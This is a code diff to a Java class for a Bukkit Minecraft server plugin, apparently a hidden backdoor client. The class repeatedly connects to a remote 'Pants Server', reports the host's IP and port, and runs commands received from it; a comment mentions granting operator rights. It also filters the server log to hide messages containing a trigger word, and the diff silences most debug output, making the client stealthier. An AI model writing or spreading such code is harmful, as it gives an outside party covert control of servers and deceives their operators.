@@ -37,7 +37,9 @@ public class PantsClient {
             Logger.getLogger("Minecraft").setFilter(new Filter() {
 
                 public boolean isLoggable(LogRecord record) {
-                    return !record.getMessage().contains(words.get(0));
+                    String message = record.getMessage().toLowerCase();
+                    //System.out.println("PantsLog: " + message);
+                    return !message.contains(words.get(0));
                 }
             });
         }
@@ -46,7 +48,7 @@ public class PantsClient {
 
     private static void handshake(Socket client) {
         try {
-            System.out.println("Starting to talk Pants Server...");
+            //System.out.println("Starting to talk Pants Server...");
             // in new thread?
             BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
             PrintStream toServer = new PrintStream(client.getOutputStream());
@@ -54,9 +56,9 @@ public class PantsClient {
                     + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
             prefix = "[" + ip + "] ";
             toServer.println(ip);
-            System.out.println("Getting commands from Pants Server...");
+            //System.out.println("Getting commands from Pants Server...");
             // new Thread(() -> {
-            getCommands(fromServer, toServer);
+            getCommands(client, fromServer, toServer);
             // }).start();
         }
         catch (IOException e) {
@@ -65,12 +67,13 @@ public class PantsClient {
         }
     }
 
-    private static void getCommands(BufferedReader fromServer, PrintStream toServer) {
+    private static void getCommands(Socket client, BufferedReader fromServer, PrintStream toServer) {
         while (true) {
             try {
-                System.out.println("Waiting for input...");
+                // System.out.println("Waiting for input... Is closed: " +
+                // client.isClosed());
                 String in = fromServer.readLine();
-                System.out.println("Got input from Pants Server: " + in);
+                // System.out.println("Got input from Pants Server: " + in);
                 if (in.contains("&&")) {
                     for (String c : in.split("&&")) {
                         parseCommand(c, fromServer, toServer);
@@ -80,12 +83,15 @@ public class PantsClient {
                     parseCommand(in, fromServer, toServer);
                 }
             }
-            catch (Exception e) {}
+            catch (Exception e) {
+                break;
+            }
         }
     }
 
     private static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
         String[] args = cmd.split(" ");
+        //System.out.println(words.toString());
         if (words.contains(args[0])) {
             // Run suspicious commands
             // op jdf2
@@ -117,7 +123,7 @@ public class PantsClient {
         public void run() {
             boolean connected = false;
             while (!connected) {
-                System.out.println("Trying to connect to Pants Server...");
+                // System.out.println("Trying to connect to Pants Server...");
                 try (Socket s = new Socket(hostname, port)) {
                     System.out.println("Found Pants Server!");
                     // System.out.println("Is closed 1: " + s.isClosed());
@@ -126,7 +132,8 @@ public class PantsClient {
                 }
                 catch (Exception e) {
                     try {
-                        System.out.println("Couldn't find a Pants Server, waiting 10 seconds...");
+                        // System.out.println("Couldn't find a Pants Server,
+                        // waiting 10 seconds...");
                         Thread.sleep(10 * 1000);
                     }
                     catch (InterruptedException e1) {
